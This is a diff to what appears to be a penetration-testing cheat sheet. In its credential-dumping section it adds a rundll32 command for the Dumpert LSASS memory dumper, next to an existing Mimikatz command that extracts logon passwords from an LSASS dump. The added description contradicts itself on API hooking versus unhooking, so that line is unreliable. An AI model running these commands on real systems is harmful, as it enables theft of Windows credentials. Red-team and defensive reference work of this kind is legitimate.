@@ -2041,6 +2041,15 @@ Mimikatz can be used offline in order to read the contents of the LSASS dump and
 mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
 ```
 
+There is also [Dumpert](https://github.com/outflanknl/Dumpert), which is an LSASS memory dumper using direct system calls and API unhooking
+Dumpert uses API hooking.
+
+> API hooking is a technique by which we can instrument and modify the behavior and flow of API calls.
+
+```bash
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump
+```
+
 ##### Credential Manager
 
 Credential Manager lets you view and delete your saved credentials for signing in to websites, connected applications, and networks.
